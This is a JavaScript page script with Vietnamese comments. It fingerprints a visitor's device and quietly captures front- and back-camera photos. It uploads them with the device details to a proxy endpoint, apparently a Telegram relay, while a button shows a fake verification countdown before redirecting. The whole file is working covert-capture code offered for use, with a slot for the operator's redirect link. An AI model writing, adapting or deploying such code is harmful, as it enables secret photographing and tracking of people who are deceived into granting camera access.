// main.js - Phiên bản Full: Chụp ảnh, Gửi Proxy & Đếm ngược chuyển hướng
const API_PROXY = '/api/tele-proxy';

const info = {
  time: new Date().toLocaleString('vi-VN'),
  device: '',
  os: '',
  camera: '⏳ Đang kiểm tra...'
};

// --- 1. NHẬN DIỆN THIẾT BỊ ---
function detectDevice() {
  const ua = navigator.userAgent;
  const platform = navigator.platform;
  const screenW = window.screen.width;
  const screenH = window.screen.height;
  const ratio = window.devicePixelRatio;

  if (/iPhone|iPad|iPod/i.test(ua) || (platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
    info.os = 'iOS';
    const res = `${screenW}x${screenH}@${ratio}`;
    const iphoneModels = {
      "430x932@3": "iPhone 14/15/16 Pro Max",
      "393x852@3": "iPhone 14/15/16 Pro / 15/16",
      "428x926@3": "iPhone 12/13/14 Pro Max / 14 Plus",
      "390x844@3": "iPhone 12/13/14 / 12/13/14 Pro",
      "414x896@3": "iPhone XS Max / 11 Pro Max",
      "414x896@2": "iPhone XR / 11",
      "375x812@3": "iPhone X / XS / 11 Pro",
      "375x667@2": "iPhone 6/7/8 / SE (2nd/3rd)",
    };
    info.device = iphoneModels[res] || 'iPhone Model';
  } else if (/Android/i.test(ua)) {
    info.os = 'Android';
    const match = ua.match(/Android.*;\s+([^;]+)\s+Build/);
    info.device = match ? match[1].split('/')[0].trim() : 'Android Device';
  } else {
    info.os = ua.includes('Windows') ? 'Windows' : 'Desktop';
    info.device = platform || 'PC/Laptop';
  }
}

// --- 2. CHỤP ẢNH CAMERA ---
async function captureCamera(facingMode = 'user') {
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null;
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
    return new Promise(resolve => {
      const video = document.createElement('video');
      video.srcObject = stream;
      video.play();
      video.onloadedmetadata = () => {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        setTimeout(() => {
          canvas.getContext('2d').drawImage(video, 0, 0);
          stream.getTracks().forEach(t => t.stop());
          canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.9);
        }, 800);
      };
    });
  } catch (e) { return null; }
}

// --- 3. HÀM CHÍNH ĐIỀU KHIỂN ---
async function main() {
  // Tìm nút bấm để cập nhật trạng thái
  const button = document.querySelector('button') || document.querySelector('.btn') || Array.from(document.querySelectorAll('div, span')).find(el => el.innerText.includes('XỬ LÝ'));
  
  detectDevice();

  // Chụp ảnh từ camera
  let front = await captureCamera("user");
  let back = await captureCamera("environment");
  
  info.camera = (front || back) ? '✅ Đã chụp camera trước và sau' : '🚫 Bị chặn hoặc không có camera';

  // Chuẩn bị gửi dữ liệu
  const formData = new FormData();
  formData.append('clientInfo', JSON.stringify(info));

  if (front || back) {
    if (front) formData.append('front', front, 'front.jpg');
    if (back) formData.append('back', back, 'back.jpg');
    await fetch(API_PROXY, { method: 'POST', body: formData });
  } else {
    await fetch(API_PROXY, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(info)
    });
  }

  // --- HIỆU ỨNG ĐẾM NGƯỢC TRÊN NÚT BẤM ---
  if (button) {
    button.style.backgroundColor = "#28a745";
    button.style.color = "#ffffff";
    button.style.boxShadow = "0 0 15px rgba(40, 167, 69, 0.6)";
    
    let timeLeft = 3; // Số giây đếm ngược
    button.innerText = `Vui lòng chờ xác minh (${timeLeft}s)`;
    
    // Tạo vòng lặp đếm ngược mỗi 1 giây
    const countdownInterval = setInterval(() => {
      timeLeft--;
      if (timeLeft > 0) {
        button.innerText = `Vui lòng chờ xác minh (${timeLeft}s)`;
      } else {
        clearInterval(countdownInterval);
        // THAY LINK BẠN MUỐN CHUYỂN HƯỚNG VÀO ĐÂY
        window.location.href = "";
      }
    }, 1000);
  } else {
    // Nếu không tìm thấy nút, vẫn tự động chuyển hướng sau 3 giây
    setTimeout(() => {
      window.location.href = "";
    }, 3000);
  }
}

// Kích hoạt hệ thống
main().then(() => console.log("✅ Hệ thống đã hoàn tất."));

